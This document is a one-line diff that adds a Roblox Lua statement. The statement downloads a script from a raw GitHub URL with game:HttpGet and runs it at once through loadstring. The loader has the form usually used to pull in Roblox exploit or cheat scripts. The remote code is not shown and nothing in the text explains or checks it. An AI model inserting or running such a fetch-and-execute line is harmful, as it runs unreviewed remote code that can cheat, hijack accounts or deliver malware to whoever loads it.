@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kickbox-er/biome/refs/heads/main/fest1"))()
